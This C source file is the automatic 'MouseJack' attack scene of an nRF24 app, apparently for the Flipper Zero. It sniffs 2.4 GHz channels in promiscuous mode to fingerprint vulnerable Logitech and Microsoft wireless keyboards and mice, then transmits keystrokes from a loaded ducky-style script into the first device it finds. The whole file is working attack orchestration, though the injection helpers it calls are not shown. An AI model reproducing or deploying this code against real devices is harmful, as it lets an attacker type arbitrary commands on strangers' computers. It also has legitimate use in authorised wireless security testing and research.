#include "../nrf24_app.h"
#include "../nrf24_hw.h"
#include "../helpers/nrf24_mj_core.h"
#include "../helpers/nrf24_mj_ducky.h"

#include <furi.h>
#include <string.h>

#define TAG "Nrf24MjAuto"

#define MJ_AUTO_CH_MIN     2
#define MJ_AUTO_CH_MAX     84
#define MJ_AUTO_TRIES_PER_CH 6
#define MJ_AUTO_SCAN_TIMEOUT_MS 60000 /* give up after a minute */

typedef struct {
    Nrf24App* app;
    FuriThread* worker;
    volatile bool stop;
    MjScript* script;
} Nrf24MjAutoCtx;

static Nrf24MjAutoCtx* g_ctx = NULL;

static bool mj_auto_should_stop(Nrf24MjAutoCtx* ctx) {
    return ctx->stop;
}

/* Scan one channel; return >=0 (target index) on hit, -1 otherwise. */
static int auto_scan_one_channel(Nrf24MjAutoCtx* ctx, uint8_t ch) {
    Nrf24App* app = ctx->app;
    nrf24_hw_acquire();
    nrf24_hw_ce(false);
    nrf24_hw_set_channel(ch);
    nrf24_hw_flush_rx();
    nrf24_hw_ce(true);
    nrf24_hw_release();

    int hit = -1;
    for(int t = 0; t < MJ_AUTO_TRIES_PER_CH && !mj_auto_should_stop(ctx); t++) {
        /* Yield the worker core while listening; busy-waiting here made a
         * full-band scan consume most of a core for the whole timeout. */
        furi_delay_ms(1);
        if(mj_auto_should_stop(ctx)) break;
        nrf24_hw_acquire();
        if(nrf24_hw_rx_data_ready()) {
            uint8_t buf[32];
            /* 0 return = SPI read failed, buf has no real data → skip it. */
            if(nrf24_hw_rx_read_payload(buf, sizeof(buf)) != 0) {
                nrf24_hw_release();
                int idx =
                    mj_fingerprint(buf, sizeof(buf), ch, app->mj_targets, &app->mj_target_count);
                if(idx >= 0) {
                    hit = idx;
                    break;
                }
            } else {
                nrf24_hw_release();
            }
        } else {
            nrf24_hw_release();
        }
    }
    return hit;
}

static int32_t mj_auto_worker(void* context) {
    Nrf24MjAutoCtx* ctx = context;
    Nrf24App* app = ctx->app;

    nrf24_hw_init();

    nrf24_hw_acquire();
    bool ok = nrf24_hw_probe();
    nrf24_hw_release();

    if(!ok) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            { model->hardware_ok = false; },
            true);
        nrf24_hw_deinit();
        return 0;
    }

    /* Open script first — fail fast if missing. */
    const char* path = furi_string_get_cstr(app->mj_script_path);
    ctx->script = mj_script_open(app->storage, path);
    if(!ctx->script) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text, "Cannot open script", sizeof(model->error_text) - 1);
            },
            true);
        nrf24_hw_acquire();
        nrf24_hw_power_down();
        nrf24_hw_release();
        nrf24_hw_deinit();
        return 0;
    }

    /* Update model: scanning */
    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseScanning;
            model->hardware_ok = true;
            model->target_label[0] = '\0';
            strncpy(
                model->script_name, ctx->script->file_name, sizeof(model->script_name) - 1);
            model->script_name[sizeof(model->script_name) - 1] = '\0';
            model->line_total = ctx->script->total_lines;
            model->line_cur = 0;
            model->last_warning[0] = '\0';
            model->error_text[0] = '\0';
        },
        true);

    /* Promiscuous RX */
    nrf24_hw_acquire();
    nrf24_hw_rx_start_promiscuous(MJ_AUTO_CH_MIN);
    nrf24_hw_release();

    int target_idx = -1;
    uint32_t scan_start = furi_get_tick();
    uint32_t last_progress_tick = scan_start;
    FURI_LOG_I(
        TAG,
        "Auto scan started channels=%u..%u timeout=%u ms",
        (unsigned)MJ_AUTO_CH_MIN,
        (unsigned)MJ_AUTO_CH_MAX,
        (unsigned)MJ_AUTO_SCAN_TIMEOUT_MS);
    while(!mj_auto_should_stop(ctx) && target_idx < 0 &&
          (furi_get_tick() - scan_start) < pdMS_TO_TICKS(MJ_AUTO_SCAN_TIMEOUT_MS)) {
        for(uint8_t ch = MJ_AUTO_CH_MIN; ch <= MJ_AUTO_CH_MAX &&
                                          !mj_auto_should_stop(ctx);
            ch++) {
            int idx = auto_scan_one_channel(ctx, ch);
            if(idx >= 0) {
                target_idx = idx;
                break;
            }
            if((ch & 0x07) == 0) {
                with_view_model(
                    app->mj_attack_view,
                    Nrf24MjAttackModel * model,
                    { model->current_channel = ch; },
                    true);
                uint32_t now = furi_get_tick();
                if((now - last_progress_tick) >= pdMS_TO_TICKS(5000)) {
                    FURI_LOG_I(
                        TAG,
                        "Auto scan progress channel=%u targets=%u elapsed_ticks=%lu",
                        (unsigned)ch,
                        (unsigned)app->mj_target_count,
                        (unsigned long)(now - scan_start));
                    last_progress_tick = now;
                }
            }
            /* This scanner otherwise spins continuously for up to a minute.
             * Give GUI/input and other radio service tasks a scheduling window
             * after each channel's SPI lock has been released. */
            furi_delay_ms(1);
        }
    }

    FURI_LOG_I(
        TAG,
        "Auto scan ended target=%d stopped=%u targets=%u elapsed_ticks=%lu",
        target_idx,
        (unsigned)mj_auto_should_stop(ctx),
        (unsigned)app->mj_target_count,
        (unsigned long)(furi_get_tick() - scan_start));

    nrf24_hw_acquire();
    nrf24_hw_rx_stop();
    nrf24_hw_release();

    if(target_idx < 0) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text,
                    mj_auto_should_stop(ctx) ? "Aborted" : "No target found",
                    sizeof(model->error_text) - 1);
            },
            true);
        nrf24_hw_acquire();
        nrf24_hw_power_down();
        nrf24_hw_release();
        nrf24_hw_deinit();
        return 0;
    }

    const MjTarget* target = &app->mj_targets[target_idx];
    char target_label[24];
    mj_format_target(target, target_label, sizeof(target_label));

    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseRunning;
            strncpy(model->target_label, target_label, sizeof(model->target_label) - 1);
            model->target_label[sizeof(model->target_label) - 1] = '\0';
        },
        true);

    /* Switch to TX, fire script. mj_setup_tx_for_target/mj_logitech_wake/
     * mj_inject_keystroke/mj_script_step each claim nrf24_hw_acquire()/
     * release() internally for just their SPI burst — do NOT wrap this block
     * (or the script loop below) in an outer acquire/release. On a
     * shared-SPI board that also takes the global LCD/SD bus lock, and a
     * script line can be a DELAY of up to 60 s or a multi-second STRING;
     * holding the bus across that froze the display/input for the whole
     * duration (the bug this comment replaces). */
    mj_setup_tx_for_target(target);
    mj_logitech_wake(target);
    mj_reset_ms_sequence();
    if(target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt) {
        for(int i = 0; i < 6 && !mj_auto_should_stop(ctx); i++) {
            mj_inject_keystroke(target, 0, 0);
            furi_delay_ms(2);
        }
    }

    while(!mj_auto_should_stop(ctx) && !mj_script_done(ctx->script)) {
        bool more = mj_script_step(ctx->script, target, &ctx->stop);

        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->line_cur = ctx->script->current_line;
                if(ctx->script->last_warning[0]) {
                    strncpy(
                        model->last_warning,
                        ctx->script->last_warning,
                        sizeof(model->last_warning) - 1);
                    model->last_warning[sizeof(model->last_warning) - 1] = '\0';
                }
            },
            true);

        if(!more) break;
        furi_delay_ms(1);
    }

    nrf24_hw_acquire();
    nrf24_hw_tx_stop();
    nrf24_hw_power_down();
    nrf24_hw_release();
    nrf24_hw_deinit();

    if(!mj_auto_should_stop(ctx)) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            { model->phase = MjAttackPhaseDone; },
            true);
    }
    return 0;
}

void nrf24_app_scene_mj_auto_on_enter(void* context) {
    Nrf24App* app = context;

    app->mj_target_count = 0;
    app->mj_selected_target = -1;

    Nrf24MjAutoCtx* ctx = malloc(sizeof(Nrf24MjAutoCtx));
    if(!ctx) {
        FURI_LOG_E(TAG, "No memory for auto context");
        return;
    }
    memset(ctx, 0, sizeof(*ctx));
    ctx->app = app;
    g_ctx = ctx;

    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseIdle;
            model->hardware_ok = true;
            model->target_label[0] = '\0';
            model->script_name[0] = '\0';
            model->line_cur = 0;
            model->line_total = 0;
            model->last_warning[0] = '\0';
            model->error_text[0] = '\0';
            model->current_channel = 0;
        },
        true);

    view_dispatcher_switch_to_view(app->view_dispatcher, Nrf24ViewMjAttack);

    ctx->worker = furi_thread_alloc_ex("Nrf24MjAuto", 4096, mj_auto_worker, ctx);
    furi_thread_start(ctx->worker);
}

bool nrf24_app_scene_mj_auto_on_event(void* context, SceneManagerEvent event) {
    Nrf24App* app = context;
    if(event.type != SceneManagerEventTypeCustom || !g_ctx) return false;
    if(event.event == Nrf24MjAttackEventStop) {
        /* The center (OK) button is the only key the view sends. The footer
         * shows "Stop" only while Scanning/Running and "Back" otherwise, so OK
         * must match: abort the active run, or leave the scene once it has
         * finished (Done/Error/Idle). Without this, a finished run showed
         * "Back" but OK only re-asserted the stop flag — a dead button that
         * trapped the user until they pressed the physical Back key. */
        MjAttackPhase phase;
        with_view_model(
            app->mj_attack_view, Nrf24MjAttackModel * model, { phase = model->phase; }, false);
        if(phase == MjAttackPhaseScanning || phase == MjAttackPhaseRunning) {
            g_ctx->stop = true;
        } else {
            /* on_exit joins the (already finished) worker and frees g_ctx. */
            scene_manager_previous_scene(app->scene_manager);
        }
        return true;
    }
    return false;
}

void nrf24_app_scene_mj_auto_on_exit(void* context) {
    UNUSED(context);
    if(!g_ctx) return;
    g_ctx->stop = true;
    furi_thread_join(g_ctx->worker);
    furi_thread_free(g_ctx->worker);
    if(g_ctx->script) mj_script_close(g_ctx->script);
    free(g_ctx);
    g_ctx = NULL;
}
